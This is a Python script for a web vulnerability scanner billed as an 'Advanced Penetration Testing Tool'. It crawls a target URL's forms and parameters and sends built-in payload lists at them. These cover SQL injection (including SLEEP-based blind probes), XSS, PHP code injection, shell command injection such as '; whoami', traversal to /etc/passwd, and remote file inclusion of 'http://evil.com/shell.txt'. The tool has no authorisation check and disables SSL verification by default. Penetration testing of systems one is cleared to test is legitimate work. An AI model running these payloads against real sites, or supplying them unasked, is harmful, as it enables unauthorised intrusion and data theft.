import requests
import time
import random
import re
from urllib.parse import urljoin, urlparse, parse_qs, quote
from bs4 import BeautifulSoup
import argparse
import json
import sys
from colorama import init, Fore, Style
import urllib3
import os
from datetime import datetime

# Отключим предупреждения о небезопасных SSL-сертификатах
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Initialize colorama
init(autoreset=True)

# Banner
def print_banner():
    banner = f"""
{Fore.CYAN}╔══════════════════════════════════════════════════════════════════════════════╗
{Fore.CYAN}║                                                                              ║
{Fore.CYAN}║{Fore.MAGENTA}                          WEB VULNERABILITY SCANNER                           {Fore.CYAN}║
{Fore.CYAN}║{Fore.MAGENTA}                     Advanced Penetration Testing Tool                        {Fore.CYAN}║
{Fore.CYAN}║                                                                              ║
{Fore.CYAN}╚══════════════════════════════════════════════════════════════════════════════╝
{Style.RESET_ALL}
"""
    print(banner)

class AdvancedPentestTool:
    def __init__(self, target_url, delay=1, auth_data=None, cookies=None,
                 payload_files=None, verify_ssl=False, output_file=None):
        self.target_url = target_url
        self.delay = delay
        self.verify_ssl = verify_ssl
        self.output_file = output_file
        self.results = []
        self.session = requests.Session()
        self.session.headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Connection': 'keep-alive',
        }

        # Add cookies if provided
        if cookies:
            self.session.cookies.update(cookies)

        # Authentication if provided
        if auth_data:
            self.authenticate(auth_data)

        # Collect all forms and URL parameters
        self.forms = self.extract_forms()
        self.url_params = self.extract_url_params()

        # Load payloads from files if provided
        self.payloads = self.load_payloads(payload_files)

    def log_result(self, vulnerability_type, location, payload, confidence="Medium"):
        """Log vulnerability findings"""
        result = {
            "type": vulnerability_type,
            "location": location,
            "payload": payload,
            "confidence": confidence,
            "timestamp": datetime.now().isoformat()
        }
        self.results.append(result)

        # Print to console
        print(f"{Fore.YELLOW}[!] {vulnerability_type} found at {location}")
        print(f"{Fore.YELLOW}[!] Payload: {payload}")
        print(f"{Fore.YELLOW}[!] Confidence: {confidence}")
        print(f"{Fore.YELLOW}[!] {'-'*50}")

        # Save to file if specified
        if self.output_file:
            self.save_results()

    def save_results(self):
        """Save results to output file"""
        try:
            with open(self.output_file, 'w', encoding='utf-8') as f:
                json.dump(self.results, f, indent=2, ensure_ascii=False)
        except Exception as e:
            print(f"{Fore.RED}[-] Error saving results: {e}")

    def load_payloads(self, payload_files):
        """Load payloads from files or use default ones"""
        payloads = {
            'sql': [
                "'", "''", "`", "``", ",", "\"", "\"\"", ";",
                "' OR '1'='1'--", "' OR 1=1--", "' UNION SELECT NULL--",
                "' UNION SELECT NULL,NULL--", "' OR SLEEP(5)--",
                "' OR (SELECT * FROM (SELECT(SLEEP(5)))a)--",
                "' OR (SELECT * FROM (SELECT(SLEEP(5)))a) AND 'a'='a"
            ],
            'xss': [
                "<script>alert('XSS')</script>",
                "<img src=x onerror=alert('XSS')>",
                "'\"><script>alert('XSS')</script>",
                "<svg onload=alert('XSS')>",
                "javascript:alert('XSS')",
                "data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4="
            ],
            'html': [
                "<h1>HTML Injection Test</h1>",
                "<div style='color:red;'>HTML Injection Test</div>",
                "<a href='http://evil.com'>Click me</a>",
                "<iframe src='http://evil.com' width='500' height='500'></iframe>"
            ],
            'css': [
                "color:red;", "background-color:red;", "font-size:100px;",
                "expression(alert('CSS Injection'))",
                "javascript:alert('CSS Injection')"
            ],
            'php': [
                "'; phpinfo(); $a='", "\"; phpinfo(); $a=\"",
                "<?php phpinfo(); ?>", "<? phpinfo(); ?>",
                "%3C?php%20phpinfo()%3B%20%3F%3E"
            ],
            'command': [
                "; whoami", "| whoami", "&& whoami", "|| whoami",
                "`whoami`", "$(whoami)", "; id", "| id"
            ],
            'traversal': [
                "../../../../etc/passwd",
                "....//....//....//....//etc/passwd",
                "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
                "..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts"
            ],
            'redirect': [
                "https://evil.com", "//evil.com", "http://evil.com",
                r"\/\/evil.com", "javascript:alert(1)"
            ],
            'inclusion': [
                "../../../../etc/passwd",
                "....//....//....//....//etc/passwd",
                "php://filter/convert.base64-encode/resource=index.php",
                "file:///etc/passwd", "http://evil.com/shell.txt"
            ]
        }

        # Load payloads from files if provided
        if payload_files:
            for payload_type, file_path in payload_files.items():
                if file_path and os.path.exists(file_path):
                    try:
                        with open(file_path, 'r', encoding='utf-8') as f:
                            payloads[payload_type] = [
                                line.strip() for line in f if line.strip() and not line.startswith('#')
                            ]
                        print(f"{Fore.GREEN}[+] Loaded {len(payloads[payload_type])} {payload_type.upper()} payloads from {file_path}")
                    except Exception as e:
                        print(f"{Fore.RED}[-] Error loading {payload_type} payloads from {file_path}: {e}")
                elif file_path:
                    print(f"{Fore.RED}[-] Payload file not found: {file_path}")

        return payloads

    def authenticate(self, auth_data):
        """Authenticate on the website"""
        try:
            if auth_data.get('type') == 'basic':
                self.session.auth = (auth_data['username'], auth_data['password'])
                print(f"{Fore.GREEN}[+] Basic authentication configured")
            elif auth_data.get('type') == 'form':
                login_url = auth_data.get('login_url', self.target_url)
                response = self.session.post(
                    login_url,
                    data=auth_data['data'],
                    verify=self.verify_ssl,
                    timeout=30
                )
                if response.status_code in [200, 301, 302]:
                    print(f"{Fore.GREEN}[+] Form authentication successful")
                else:
                    print(f"{Fore.RED}[-] Authentication failed with status code: {response.status_code}")
        except Exception as e:
            print(f"{Fore.RED}[-] Authentication error: {e}")

    def extract_forms(self):
        """Extract all forms from the page"""
        forms = []
        try:
            response = self.session.get(
                self.target_url,
                timeout=15,
                verify=self.verify_ssl
            )
            soup = BeautifulSoup(response.text, 'html.parser')

            for form in soup.find_all('form'):
                form_details = {}
                action = form.get('action')
                form_details['action'] = urljoin(self.target_url, action) if action else self.target_url
                form_details['method'] = form.get('method', 'get').lower()
                form_details['inputs'] = []
                form_details['enctype'] = form.get('enctype', 'application/x-www-form-urlencoded')

                for input_tag in form.find_all('input'):
                    input_details = {
                        'type': input_tag.get('type', 'text'),
                        'name': input_tag.get('name'),
                        'value': input_tag.get('value', '')
                    }
                    form_details['inputs'].append(input_details)

                for textarea in form.find_all('textarea'):
                    input_details = {
                        'type': 'textarea',
                        'name': textarea.get('name'),
                        'value': textarea.get('value', '')
                    }
                    form_details['inputs'].append(input_details)

                for select in form.find_all('select'):
                    input_details = {
                        'type': 'select',
                        'name': select.get('name'),
                        'value': select.get('value', '')
                    }
                    form_details['inputs'].append(input_details)

                forms.append(form_details)

            print(f"{Fore.GREEN}[+] Found {len(forms)} forms on the page")
        except Exception as e:
            print(f"{Fore.RED}[-] Error extracting forms: {e}")

        return forms

    def extract_url_params(self):
        """Extract parameters from URL"""
        parsed_url = urlparse(self.target_url)
        params = parse_qs(parsed_url.query)
        print(f"{Fore.GREEN}[+] Found {len(params)} URL parameters")
        return params

    def delay_request(self):
        """Delay between requests"""
        sleep_time = self.delay * (0.8 + 0.4 * random.random())
        time.sleep(sleep_time)

    def test_sql_injection(self):
        """Extended SQL injection testing"""
        vulnerable = False
        print(f"{Fore.BLUE}[*] Testing SQL Injection...")

        # Testing URL parameters
        for param in self.url_params:
            original_value = self.url_params[param][0]
            for payload in self.payloads['sql']:
                try:
                    # Encode payload for URL
                    encoded_payload = quote(payload, safe='')
                    test_value = f"{original_value}{encoded_payload}"

                    # Create test URL
                    parsed = urlparse(self.target_url)
                    query = parse_qs(parsed.query, keep_blank_values=True)
                    query[param] = [test_value]
                    new_query = "&".join([f"{k}={v[0]}" for k, v in query.items()])
                    test_url = parsed._replace(query=new_query).geturl()

                    self.delay_request()
                    response = self.session.get(
                        test_url,
                        timeout=15,
                        verify=self.verify_ssl
                    )

                    # Check for SQL injection signs
                    sql_errors = [
                        "sql", "syntax", "mysql", "ora-", "postgres",
                        "warning", "undefined", "mysql_fetch", "mysqli",
                        "violation", "database", "column", "unknown column",
                        "sqlite", "microsoft.*odbc", "postgresql", "mariaDB"
                    ]

                    if any(error in response.text.lower() for error in sql_errors):
                        self.log_result("SQL Injection", f"URL parameter: {param}", payload, "High")
                        vulnerable = True
                        break

                    # Time-based detection
                    if "SLEEP" in payload.upper() or "WAITFOR" in payload.upper():
                        start_time = time.time()
                        response = self.session.get(test_url, timeout=30, verify=self.verify_ssl)
                        response_time = time.time() - start_time

                        if response_time > 5:  # If response takes more than 5 seconds
                            self.log_result("SQL Injection (Time-based)", f"URL parameter: {param}", payload, "Medium")
                            vulnerable = True
                            break

                except requests.exceptions.Timeout:
                    self.log_result("SQL Injection (Time-based)", f"URL parameter: {param}", payload, "High")
                    vulnerable = True
                    break
                except Exception as e:
                    continue

        # Testing forms
        for form in self.forms:
            for input_field in form['inputs']:
                if input_field['name']:
                    for payload in self.payloads['sql']:
                        data = {}
                        for field in form['inputs']:
                            if field['name']:
                                if field['name'] == input_field['name']:
                                    data[field['name']] = payload
                                else:
                                    data[field['name']] = field['value'] or 'test'

                        try:
                            self.delay_request()
                            if form['method'] == 'post':
                                response = self.session.post(
                                    form['action'],
                                    data=data,
                                    verify=self.verify_ssl,
                                    timeout=15
                                )
                            else:
                                response = self.session.get(
                                    form['action'],
                                    params=data,
                                    verify=self.verify_ssl,
                                    timeout=15
                                )

                            # Check for SQL injection signs
                            sql_errors = [
                                "sql", "syntax", "mysql", "ora-", "postgres",
                                "warning", "undefined", "mysql_fetch", "mysqli",
                                "violation", "database", "column", "unknown column"
                            ]

                            if any(error in response.text.lower() for error in sql_errors):
                                self.log_result("SQL Injection", f"Form {form['action']}, field {input_field['name']}", payload, "High")
                                vulnerable = True
                                break

                        except Exception as e:
                            continue

        return vulnerable

    def test_xss(self):
        """Extended XSS testing"""
        vulnerable = False
        print(f"{Fore.BLUE}[*] Testing XSS...")

        # Testing URL parameters
        for param in self.url_params:
            for payload in self.payloads['xss']:
                try:
                    # URL encode the payload
                    encoded_payload = quote(payload, safe='')
                    test_value = f"{self.url_params[param][0]}{encoded_payload}"

                    parsed = urlparse(self.target_url)
                    query = parse_qs(parsed.query, keep_blank_values=True)
                    query[param] = [test_value]
                    new_query = "&".join([f"{k}={v[0]}" for k, v in query.items()])
                    test_url = parsed._replace(query=new_query).geturl()

                    self.delay_request()
                    response = self.session.get(
                        test_url,
                        timeout=15,
                        verify=self.verify_ssl
                    )

                    # Improved XSS detection
                    if (payload in response.text or
                        payload.replace('<', '&lt;') in response.text or
                        payload.replace('>', '&gt;') in response.text):
                        # Check if payload was executed or just reflected
                        soup = BeautifulSoup(response.text, 'html.parser')
                        scripts = soup.find_all('script')
                        for script in scripts:
                            if payload in script.text:
                                self.log_result("XSS", f"URL parameter: {param}", payload, "High")
                                vulnerable = True
                                break

                        # Check for other HTML elements that might execute code
                        for tag in soup.find_all():
                            if hasattr(tag, 'attrs'):
                                for attr, value in tag.attrs.items():
                                    if isinstance(value, str) and payload in value:
                                        self.log_result("XSS", f"URL parameter: {param}", payload, "Medium")
                                        vulnerable = True
                                        break

                except Exception as e:
                    continue

        # Forms testing
        for form in self.forms:
            for input_field in form['inputs']:
                if input_field['name']:
                    for payload in self.payloads['xss']:
                        data = {}
                        for field in form['inputs']:
                            if field['name']:
                                if field['name'] == input_field['name']:
                                    data[field['name']] = payload
                                else:
                                    data[field['name']] = field['value'] or 'test'

                        try:
                            self.delay_request()
                            if form['method'] == 'post':
                                response = self.session.post(
                                    form['action'],
                                    data=data,
                                    verify=self.verify_ssl,
                                    timeout=15
                                )
                            else:
                                response = self.session.get(
                                    form['action'],
                                    params=data,
                                    verify=self.verify_ssl,
                                    timeout=15
                                )

                            # Check if payload is reflected in response
                            if payload in response.text:
                                self.log_result("XSS", f"Form {form['action']}, field {input_field['name']}", payload, "Medium")
                                vulnerable = True
                                break

                        except Exception as e:
                            continue

        return vulnerable

    def test_html_injection(self):
        """HTML Injection testing"""
        vulnerable = False
        print(f"{Fore.BLUE}[*] Testing HTML Injection...")

        # Testing URL parameters
        for param in self.url_params:
            for payload in self.payloads['html']:
                try:
                    # Create test URL
                    parsed = urlparse(self.target_url)
                    query = parse_qs(parsed.query, keep_blank_values=True)
                    query[param] = [payload]
                    new_query = "&".join([f"{k}={quote(v[0])}" for k, v in query.items()])
                    test_url = parsed._replace(query=new_query).geturl()

                    self.delay_request()
                    response = self.session.get(
                        test_url,
                        timeout=15,
                        verify=self.verify_ssl
                    )

                    # Check if HTML is rendered without escaping
                    if payload in response.text and not any(escape in response.text for escape in ["&lt;", "&gt;", "&quot;", "&#x"]):
                        self.log_result("HTML Injection", f"URL parameter: {param}", payload, "Medium")
                        vulnerable = True
                        break

                except Exception as e:
                    continue

        # Testing forms
        for form in self.forms:
            for input_field in form['inputs']:
                if input_field['name']:
                    for payload in self.payloads['html']:
                        data = {}
                        for field in form['inputs']:
                            if field['name']:
                                if field['name'] == input_field['name']:
                                    data[field['name']] = payload
                                else:
                                    data[field['name']] = field['value'] or 'test'

                        try:
                            self.delay_request()
                            if form['method'] == 'post':
                                response = self.session.post(
                                    form['action'],
                                    data=data,
                                    verify=self.verify_ssl,
                                    timeout=15
                                )
                            else:
                                response = self.session.get(
                                    form['action'],
                                    params=data,
                                    verify=self.verify_ssl,
                                    timeout=15
                                )

                            # Check if HTML is rendered without escaping
                            if payload in response.text and not any(escape in response.text for escape in ["&lt;", "&gt;", "&quot;", "&#x"]):
                                self.log_result("HTML Injection", f"Form {form['action']}, field {input_field['name']}", payload, "Medium")
                                vulnerable = True
                                break

                        except Exception as e:
                            continue

        return vulnerable

    def test_css_injection(self):
        """CSS Injection testing"""
        vulnerable = False
        print(f"{Fore.BLUE}[*] Testing CSS Injection...")

        # Testing URL parameters
        for param in self.url_params:
            for payload in self.payloads['css']:
                try:
                    # Create test URL
                    parsed = urlparse(self.target_url)
                    query = parse_qs(parsed.query, keep_blank_values=True)
                    query[param] = [payload]
                    new_query = "&".join([f"{k}={quote(v[0])}" for k, v in query.items()])
                    test_url = parsed._replace(query=new_query).geturl()

                    self.delay_request()
                    response = self.session.get(
                        test_url,
                        timeout=15,
                        verify=self.verify_ssl
                    )

                    # Check if CSS is rendered in the response
                    if payload in response.text and "style" in response.text:
                        self.log_result("CSS Injection", f"URL parameter: {param}", payload, "Low")
                        vulnerable = True
                        break

                except Exception as e:
                    continue

        # Testing forms
        for form in self.forms:
            for input_field in form['inputs']:
                if input_field['name']:
                    for payload in self.payloads['css']:
                        data = {}
                        for field in form['inputs']:
                            if field['name']:
                                if field['name'] == input_field['name']:
                                    data[field['name']] = payload
                                else:
                                    data[field['name']] = field['value'] or 'test'

                        try:
                            self.delay_request()
                            if form['method'] == 'post':
                                response = self.session.post(
                                    form['action'],
                                    data=data,
                                    verify=self.verify_ssl,
                                    timeout=15
                                )
                            else:
                                response = self.session.get(
                                    form['action'],
                                    params=data,
                                    verify=self.verify_ssl,
                                    timeout=15
                                )

                            # Check if CSS is rendered in the response
                            if payload in response.text and "style" in response.text:
                                self.log_result("CSS Injection", f"Form {form['action']}, field {input_field['name']}", payload, "Low")
                                vulnerable = True
                                break

                        except Exception as e:
                            continue

        return vulnerable

    def test_php_injection(self):
        """PHP Injection testing"""
        vulnerable = False
        print(f"{Fore.BLUE}[*] Testing PHP Injection...")

        # Testing URL parameters
        for param in self.url_params:
            for payload in self.payloads['php']:
                try:
                    # Create test URL
                    parsed = urlparse(self.target_url)
                    query = parse_qs(parsed.query, keep_blank_values=True)
                    query[param] = [payload]
                    new_query = "&".join([f"{k}={quote(v[0])}" for k, v in query.items()])
                    test_url = parsed._replace(query=new_query).geturl()

                    self.delay_request()
                    response = self.session.get(
                        test_url,
                        timeout=15,
                        verify=self.verify_ssl
                    )

                    # Check for PHP execution signs
                    if "phpinfo" in response.text and ("Configuration" in response.text or "PHP Version" in response.text):
                        self.log_result("PHP Injection", f"URL parameter: {param}", payload, "High")
                        vulnerable = True
                        break

                except Exception as e:
                    continue

        # Testing forms
        for form in self.forms:
            for input_field in form['inputs']:
                if input_field['name']:
                    for payload in self.payloads['php']:
                        data = {}
                        for field in form['inputs']:
                            if field['name']:
                                if field['name'] == input_field['name']:
                                    data[field['name']] = payload
                                else:
                                    data[field['name']] = field['value'] or 'test'

                        try:
                            self.delay_request()
                            if form['method'] == 'post':
                                response = self.session.post(
                                    form['action'],
                                    data=data,
                                    verify=self.verify_ssl,
                                    timeout=15
                                )
                            else:
                                response = self.session.get(
                                    form['action'],
                                    params=data,
                                    verify=self.verify_ssl,
                                    timeout=15
                                )

                            # Check for PHP execution signs
                            if "phpinfo" in response.text and ("Configuration" in response.text or "PHP Version" in response.text):
                                self.log_result("PHP Injection", f"Form {form['action']}, field {input_field['name']}", payload, "High")
                                vulnerable = True
                                break

                        except Exception as e:
                            continue

        return vulnerable

    def test_command_injection(self):
        """Command Injection testing"""
        vulnerable = False
        print(f"{Fore.BLUE}[*] Testing Command Injection...")

        # Testing URL parameters
        for param in self.url_params:
            for payload in self.payloads['command']:
                try:
                    # Create test URL
                    parsed = urlparse(self.target_url)
                    query = parse_qs(parsed.query, keep_blank_values=True)
                    query[param] = [payload]
                    new_query = "&".join([f"{k}={quote(v[0])}" for k, v in query.items()])
                    test_url = parsed._replace(query=new_query).geturl()

                    self.delay_request()
                    response = self.session.get(
                        test_url,
                        timeout=15,
                        verify=self.verify_ssl
                    )

                    # Check for command output in response
                    if any(indicator in response.text for indicator in ["root", "uid=", "gid=", "groups="]):
                        self.log_result("Command Injection", f"URL parameter: {param}", payload, "Medium")
                        vulnerable = True
                        break

                except Exception as e:
                    continue

        # Testing forms
        for form in self.forms:
            for input_field in form['inputs']:
                if input_field['name']:
                    for payload in self.payloads['command']:
                        data = {}
                        for field in form['inputs']:
                            if field['name']:
                                if field['name'] == input_field['name']:
                                    data[field['name']] = payload
                                else:
                                    data[field['name']] = field['value'] or 'test'

                        try:
                            self.delay_request()
                            if form['method'] == 'post':
                                response = self.session.post(
                                    form['action'],
                                    data=data,
                                    verify=self.verify_ssl,
                                    timeout=15
                                )
                            else:
                                response = self.session.get(
                                    form['action'],
                                    params=data,
                                    verify=self.verify_ssl,
                                    timeout=15
                                )

                            # Check for command output in response
                            if any(indicator in response.text for indicator in ["root", "uid=", "gid=", "groups="]):
                                self.log_result("Command Injection", f"Form {form['action']}, field {input_field['name']}", payload, "Medium")
                                vulnerable = True
                                break

                        except Exception as e:
                            continue

        return vulnerable

    def test_directory_traversal(self):
        """Directory Traversal testing"""
        vulnerable = False
        print(f"{Fore.BLUE}[*] Testing Directory Traversal...")

        # Testing URL parameters
        for param in self.url_params:
            for payload in self.payloads['traversal']:
                try:
                    # Create test URL
                    parsed = urlparse(self.target_url)
                    query = parse_qs(parsed.query, keep_blank_values=True)
                    query[param] = [payload]
                    new_query = "&".join([f"{k}={quote(v[0])}" for k, v in query.items()])
                    test_url = parsed._replace(query=new_query).geturl()

                    self.delay_request()
                    response = self.session.get(
                        test_url,
                        timeout=15,
                        verify=self.verify_ssl
                    )

                    # Check for sensitive file content
                    if any(indicator in response.text.lower() for indicator in ["root:", "[boot loader]", "windows", "etc/passwd"]):
                        self.log_result("Directory Traversal", f"URL parameter: {param}", payload, "High")
                        vulnerable = True
                        break

                except Exception as e:
                    continue

        return vulnerable

    def test_open_redirect(self):
        """Open Redirect testing"""
        vulnerable = False
        print(f"{Fore.BLUE}[*] Testing Open Redirect...")

        redirect_params = ['url', 'next', 'redirect', 'target', 'rurl', 'dest', 'destination', 'redir', 'link']

        # Testing URL parameters
        for param in self.url_params:
            if param.lower() in redirect_params:
                for payload in self.payloads['redirect']:
                    try:
                        # Create test URL
                        parsed = urlparse(self.target_url)
                        query = parse_qs(parsed.query, keep_blank_values=True)
                        query[param] = [payload]
                        new_query = "&".join([f"{k}={quote(v[0])}" for k, v in query.items()])
                        test_url = parsed._replace(query=new_query).geturl()

                        self.delay_request()
                        response = self.session.get(
                            test_url,
                            timeout=15,
                            verify=self.verify_ssl,
                            allow_redirects=False
                        )

                        # Check for redirect to external domain
                        if response.status_code in [301, 302, 307, 308]:
                            location = response.headers.get('Location', '')
                            if any(domain in location for domain in ['evil.com', '//evil.com']):
                                self.log_result("Open Redirect", f"URL parameter: {param}", payload, "Medium")
                                vulnerable = True
                                break

                    except Exception as e:
                        continue

        return vulnerable

    def test_file_inclusion(self):
        """Local/Remote File Inclusion testing"""
        vulnerable = False
        print(f"{Fore.BLUE}[*] Testing File Inclusion...")

        # Testing URL parameters
        for param in self.url_params:
            for payload in self.payloads['inclusion']:
                try:
                    # Create test URL
                    parsed = urlparse(self.target_url)
                    query = parse_qs(parsed.query, keep_blank_values=True)
                    query[param] = [payload]
                    new_query = "&".join([f"{k}={quote(v[0])}" for k, v in query.items()])
                    test_url = parsed._replace(query=new_query).geturl()

                    self.delay_request()
                    response = self.session.get(
                        test_url,
                        timeout=15,
                        verify=self.verify_ssl
                    )

                    # Check for LFI/RFI indicators
                    if any(indicator in response.text.lower() for indicator in ["root:", "<?php", "mysql_connect"]):
                        self.log_result("Local File Inclusion", f"URL parameter: {param}", payload, "High")
                        vulnerable = True
                        break
                    elif "evil.com" in response.text:
                        self.log_result("Remote File Inclusion", f"URL parameter: {param}", payload, "High")
                        vulnerable = True
                        break

                except Exception as e:
                    continue

        return vulnerable

    def run_all_tests(self):
        """Run all tests"""
        print(f"{Fore.BLUE}[*] Starting testing: {self.target_url}")
        print(f"{Fore.BLUE}[*] Found forms: {len(self.forms)}")
        print(f"{Fore.BLUE}[*] Found URL parameters: {len(self.url_params)}")
        print(f"{Fore.BLUE}[*] SSL verification: {'Enabled' if self.verify_ssl else 'Disabled'}")

        tests = [
            ("SQL Injection", self.test_sql_injection),
            ("XSS", self.test_xss),
            ("HTML Injection", self.test_html_injection),
            ("CSS Injection", self.test_css_injection),
            ("PHP Injection", self.test_php_injection),
            ("Command Injection", self.test_command_injection),
            ("Directory Traversal", self.test_directory_traversal),
            ("Open Redirect", self.test_open_redirect),
            ("File Inclusion", self.test_file_inclusion),
        ]

        for test_name, test_func in tests:
            print(f"{Fore.BLUE}[*] Testing {test_name}...")
            try:
                start_time = time.time()
                result = test_func()
                elapsed_time = time.time() - start_time

                if not result:
                    print(f"{Fore.GREEN}[-] No {test_name} vulnerabilities found ({elapsed_time:.2f}s)")
                else:
                    print(f"{Fore.YELLOW}[!] {test_name} vulnerabilities found ({elapsed_time:.2f}s)")
            except Exception as e:
                print(f"{Fore.RED}[-] Error testing {test_name}: {e}")

        print(f"{Fore.BLUE}[*] Testing completed")

        # Save results if output file specified
        if self.output_file and self.results:
            self.save_results()
            print(f"{Fore.GREEN}[+] Results saved to {self.output_file}")

if __name__ == "__main__":
    print_banner()

    parser = argparse.ArgumentParser(description='Advanced URL penetration testing tool')
    parser.add_argument('-u', '--url', required=True, help='Target URL for testing')
    parser.add_argument('-d', '--delay', type=float, default=1, help='Delay between requests in seconds')
    parser.add_argument('-c', '--cookies', help='Cookies in JSON format')
    parser.add_argument('-a', '--auth', help='Authentication data in JSON format')
    parser.add_argument('--no-ssl-verify', action='store_true', help='Disable SSL certificate verification')
    parser.add_argument('-o', '--output', help='Output file to save results (JSON format)')

    # Add payload file arguments
    parser.add_argument('--sql-file', help='File containing SQL injection payloads')
    parser.add_argument('--xss-file', help='File containing XSS payloads')
    parser.add_argument('--html-file', help='File containing HTML injection payloads')
    parser.add_argument('--css-file', help='File containing CSS injection payloads')
    parser.add_argument('--php-file', help='File containing PHP injection payloads')
    parser.add_argument('--command-file', help='File containing command injection payloads')
    parser.add_argument('--traversal-file', help='File containing directory traversal payloads')
    parser.add_argument('--redirect-file', help='File containing open redirect payloads')
    parser.add_argument('--inclusion-file', help='File containing file inclusion payloads')

    args = parser.parse_args()

    # Parse cookies
    cookies = None
    if args.cookies:
        try:
            cookies = json.loads(args.cookies)
        except json.JSONDecodeError:
            print(f"{Fore.RED}[-] Error parsing cookies. Please provide valid JSON")
            sys.exit(1)

    # Parse authentication data
    auth_data = None
    if args.auth:
        try:
            auth_data = json.loads(args.auth)
        except json.JSONDecodeError:
            print(f"{Fore.RED}[-] Error parsing authentication data. Please provide valid JSON")
            sys.exit(1)

    # Prepare payload files dictionary
    payload_files = {
        'sql': args.sql_file,
        'xss': args.xss_file,
        'html': args.html_file,
        'css': args.css_file,
        'php': args.php_file,
        'command': args.command_file,
        'traversal': args.traversal_file,
        'redirect': args.redirect_file,
        'inclusion': args.inclusion_file
    }

    pentester = AdvancedPentestTool(
        args.url,
        args.delay,
        auth_data,
        cookies,
        payload_files,
        verify_ssl=not args.no_ssl_verify,
        output_file=args.output
    )
    pentester.run_all_tests()
